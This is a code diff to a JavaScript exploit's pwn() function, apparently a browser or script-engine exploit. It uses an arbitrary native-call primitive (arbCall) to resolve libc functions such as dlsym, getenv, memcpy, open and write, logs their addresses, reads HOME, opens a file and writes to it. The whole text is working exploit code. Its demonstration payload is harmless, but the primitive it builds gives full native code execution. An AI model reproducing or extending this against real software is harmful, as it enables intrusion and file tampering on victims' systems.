@@ -433,12 +433,14 @@ function pwn() {
     let memcpyAddr = arbCall(dlsymAddr, -2, "memcpy");
     let strlenAddr = arbCall(dlsymAddr, -2, "strlen");
     let openAddr = arbCall(dlsymAddr, -2, "open");
+    let writeAddr = arbCall(dlsymAddr, -2, "write");
     
     log(`[+] dlsym address: 0x${dlsymAddr.toString(16)}`);
     log(`[+] getenv address: 0x${getenvAddr.toString(16)}`);
     log(`[+] memcpy address: 0x${memcpyAddr.toString(16)}`);
     log(`[+] strlen address: 0x${strlenAddr.toString(16)}`);
     log(`[+] open address: 0x${openAddr.toString(16)}`);
+    log(`[+] write address: 0x${writeAddr.toString(16)}`);
     
     function memcpy(destination, source, size) {
         return arbCall(memcpyAddr, destination, source, size);
@@ -465,7 +467,11 @@ function pwn() {
     }
     
     function open(path, flags) {
-        return arbCall(openAddr, path, flags)
+        return arbCall(openAddr, path, flags);
+    }
+    
+    function write(fd, buf, size) {
+        return arbCall(writeAddr, fd, buf, size);
     }
     
     log(`[+] HOME: ${getenv("HOME")}`);
@@ -485,6 +491,9 @@ function pwn() {
         return;
     }
     log(`[+] fd: ${fd}`);
+    
+    write(fd, "Hello, World!", 13);
+    
 }
 
 function logBytes(array) {
